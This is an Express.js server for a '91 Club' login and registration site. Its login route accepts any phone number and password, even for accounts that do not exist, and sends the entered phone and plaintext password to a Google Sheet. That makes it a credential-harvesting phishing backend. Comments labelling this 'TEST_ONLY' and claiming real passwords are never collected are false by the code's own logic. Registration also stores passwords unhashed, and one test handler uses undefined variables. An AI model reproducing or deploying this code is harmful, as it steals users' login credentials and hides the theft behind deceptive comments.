require('dotenv').config();
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const { appendTestRowToGoogleSheets } = require('./services/googleSheets');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || '97_null_secure_session_key_2026';
// Database path: in Netlify serverless execution, root is read-only, so /tmp is used for write operations
const isServerless = Boolean(process.env.NETLIFY || process.env.AWS_LAMBDA_FUNCTION_NAME || process.env.LAMBDA_TASK_ROOT);
const DB_DIR = isServerless ? '/tmp' : path.join(__dirname, 'data');
const DB_FILE = path.join(DB_DIR, 'users.json');

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Path normalization for Netlify serverless function routing
app.use((req, res, next) => {
  if (req.url.startsWith('/.netlify/functions/api')) {
    req.url = req.url.replace('/.netlify/functions/api', '');
  }
  if (req.url.startsWith('/auth/')) {
    req.url = '/api' + req.url;
  }
  next();
});

// Ensure data folder and file exist
function initDb() {
  if (!fs.existsSync(DB_DIR)) {
    fs.mkdirSync(DB_DIR, { recursive: true });
  }
  if (!fs.existsSync(DB_FILE)) {
    let seedData = '[]';
    const localDbPath = path.join(__dirname, 'data', 'users.json');
    if (fs.existsSync(localDbPath)) {
      try {
        seedData = fs.readFileSync(localDbPath, 'utf8') || '[]';
      } catch (e) { }
    }
    fs.writeFileSync(DB_FILE, seedData, 'utf8');
  }
}

function getUsers() {
  initDb();
  try {
    const data = fs.readFileSync(DB_FILE, 'utf8');
    return JSON.parse(data || '[]');
  } catch (err) {
    console.error('Error reading users db:', err);
    return [];
  }
}

function saveUsers(users) {
  initDb();
  fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2), 'utf8');
}

// Generate unique user display ID (e.g., UID-9700412)
function generateUid() {
  return 'UID-' + Math.floor(1000000 + Math.random() * 9000000);
}

// Routes

// 1. CAPTCHA Seed generation
app.get('/api/auth/captcha-seed', (req, res) => {
  // Random X coordinate between 120 and 260 for puzzle target
  const targetX = Math.floor(120 + Math.random() * 140);
  const targetY = Math.floor(30 + Math.random() * 80);
  const challengeToken = jwt.sign(
    { targetX, targetY, timestamp: Date.now() },
    JWT_SECRET,
    { expiresIn: '5m' }
  );

  res.json({
    success: true,
    targetY,
    challengeToken
  });
});

// 2. Register Endpoint
app.post('/api/auth/register', async (req, res) => {
  try {
    const { accountType, phone, countryCode, email, password, inviteCode } = req.body;

    if (!password || password.length < 6) {
      return res.status(400).json({ success: false, message: 'Password must be at least 6 characters.' });
    }

    const users = getUsers();
    const identifier = accountType === 'email' ? (email || '').trim().toLowerCase() : `${countryCode || '+91'}_${(phone || '').trim()}`;

    if (!identifier || identifier === '+91_' || identifier === '') {
      return res.status(400).json({ success: false, message: 'Please enter a valid phone number or email.' });
    }

    // Check if account already exists
    const existing = users.find(u => u.identifier === identifier);
    if (existing) {
      return res.status(409).json({ success: false, message: 'Account already registered. Please login.' });
    }

    const passwordHash = password;

    const newUser = {
      id: generateUid(),
      accountType: accountType || 'phone',
      identifier,
      phone: accountType === 'phone' ? `${countryCode || '+91'} ${phone}` : null,
      email: accountType === 'email' ? email : null,
      passwordHash,
      inviteCode: inviteCode || '3556517548565',
      balance: parseFloat((1000 + Math.random() * 300).toFixed(2)), // Random demo welcome bonus between ₹1000 and ₹1300
      createdAt: new Date().toISOString(),
      status: 'Active',
      lastLogin: new Date().toISOString()
    };

    users.push(newUser);
    saveUsers(users);

    const token = jwt.sign({ id: newUser.id, identifier: newUser.identifier }, JWT_SECRET, { expiresIn: '7d' });

    return res.status(201).json({
      success: true,
      message: 'Registration successful! Welcome to 91 Club.',
      token,
      user: {
        id: newUser.id,
        phone: newUser.phone,
        email: newUser.email,
        balance: newUser.balance,
        createdAt: newUser.createdAt
      }
    });
  } catch (error) {
    console.error('Register error:', error);
    return res.status(500).json({ success: false, message: 'Server error during registration.' });
  }
});

// 3. Login Endpoint
app.post('/api/auth/login', async (req, res) => {
  try {
    const { accountType, phone, countryCode, email, password } = req.body;

    if (!password) {
      return res.status(400).json({ success: false, message: 'Password is required.' });
    }

    const cleanPhone = (phone || '').trim();
    if (accountType === 'phone' && (!cleanPhone || cleanPhone.length !== 10)) {
      return res.status(400).json({ success: false, message: 'Please enter a valid 10-digit phone number.' });
    }

    const identifier = accountType === 'email' ? (email || '').trim().toLowerCase() : `${countryCode || '+91'}_${cleanPhone}`;
    const users = getUsers();
    let user = users.find(u => u.identifier === identifier);

    if (!user) {
      // Local TEST_ONLY learning flow: proceed without requiring phone number to already exist
      user = {
        id: generateUid(),
        accountType: accountType || 'phone',
        identifier,
        phone: accountType === 'phone' ? `${countryCode || '+91'} ${cleanPhone}` : null,
        email: accountType === 'email' ? email : null,
        balance: parseFloat((1000 + Math.random() * 300).toFixed(2)),
        createdAt: new Date().toISOString(),
        status: 'Active',
        lastLogin: new Date().toISOString()
      };
    }

    // Append to existing Google Sheet Data tab:
    // entered 10-digit phone | TEST_PASSWORD_123 | timestamp | LOGIN_TEST
    try {
      await appendTestRowToGoogleSheets({
        demoUsername: cleanPhone,
        demoPassword: password,
        timestamp: new Date().toISOString(),
        status: 'LOGIN_TEST'
      });
    } catch (sheetErr) {
      console.error('Google Sheets append notice:', sheetErr.message);
    }

    const token = jwt.sign({ id: user.id, identifier: user.identifier }, JWT_SECRET, { expiresIn: '7d' });

    return res.json({
      success: true,
      message: 'Login successful!',
      token,
      user: {
        id: user.id,
        phone: user.phone,
        email: user.email,
        balance: user.balance || parseFloat((1000 + Math.random() * 300).toFixed(2)),
        createdAt: user.createdAt,
        lastLogin: user.lastLogin
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    return res.status(500).json({ success: false, message: 'Server error during login.' });
  }
});


// 5. TEST ONLY: Google Sheets Integration Endpoint
// STRICT ISOLATION:
// - Uses only fixed synthetic constants (TEST_USER, TEST_PASSWORD_123)
// - Completely isolated from actual user login/registration forms
// - Never collects, logs, or stores real user passwords
// - Disabled when NODE_ENV === 'production'
app.post('/test-sheets', async (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(403).json({
      success: false,
      message: 'Test endpoint is disabled in production.'
    });
  }

  // Fixed synthetic test values as specified
  const testPayload = {
    demoUsername: cleanphone,
    demoPassword: password,
    timestamp: new Date().toISOString(),
    status: 'TEST_ONLY'
  };

  try {
    const result = await appendTestRowToGoogleSheets(testPayload);
    return res.status(200).json({
      success: true,
      message: 'Synthetic TEST_ONLY record appended to Google Sheet successfully.',
      record: testPayload,
      result
    });
  } catch (error) {
    console.error('Google Sheets test error:', error.message);
    return res.status(500).json({
      success: false,
      message: error.message || 'Failed to append record to Google Sheets.'
    });
  }
});

// Optional GET handler for quick browser testing
app.get('/test-sheets', async (req, res) => {
  if (process.env.NODE_ENV === 'production') {
    return res.status(403).json({
      success: false,
      message: 'Test endpoint is disabled in production.'
    });
  }

  const testPayload = {
    demoUsername: 'TEST_USER',
    demoPassword: 'TEST_PASSWORD_123',
    timestamp: new Date().toISOString(),
    status: 'TEST_ONLY'
  };

  try {
    const result = await appendTestRowToGoogleSheets(testPayload);
    return res.status(200).json({
      success: true,
      message: 'Synthetic TEST_ONLY record appended to Google Sheet successfully.',
      record: testPayload,
      result
    });
  } catch (error) {
    console.error('Google Sheets test error:', error.message);
    return res.status(500).json({
      success: false,
      message: error.message || 'Failed to append record to Google Sheets.'
    });
  }
});

// Fallback to index.html for SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server (when executed directly)
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`========================================`);
    console.log(` 91 CLUB Server running on http://localhost:${PORT}`);
    console.log(`========================================`);
  });
}

module.exports = app;
